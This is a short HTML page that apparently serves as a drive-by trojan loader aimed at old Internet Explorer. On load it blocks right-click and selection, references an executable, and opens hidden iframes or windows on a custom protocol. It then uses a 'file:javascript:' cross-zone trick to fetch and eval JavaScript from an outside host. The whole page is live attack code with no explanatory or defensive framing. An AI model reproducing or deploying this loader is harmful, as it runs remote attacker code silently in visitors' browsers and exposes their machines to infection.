<HTML>

<BODY oncontextmenu="return false" onselectstart="return false" scroll="no" topmargin="0" leftmargin="0">
<SCRIPT LANGUAGE="xuehanlovelace" src="xuehan.exe"></SCRIPT>
<SCRIPT LANGUAGE="JavaScript">
jsurl="http://xuehan.go.nease.net/xuehan.js".replace(/\//g,'//');
WIE=navigator.appVersion;
if(WIE.indexOf("MSIE 5.0")>-1){
document.write("<iframe style='display:none;' name='xuehanlovelace' src='xuehan://'><\/iframe>");
setTimeout("muma0()",1000);
}
else {
window.open("xuehan://","_search");
setTimeout("muma1()",1000);
}

function muma0(){
window.open("file:javascript:document.all.tags('SCRIPT')[0].src='"+jsurl+"';eval();","xuehanlovelace");
}

function muma1(){
window.open("file:javascript:document.all.tags('SCRIPT')[0].src='"+jsurl+"';eval();","_search");}
</SCRIPT>
</BODY>
<NOSCRIPT><iframe style="display:none;" src='*.*'></iframe></NOSCRIPT>
</HTML>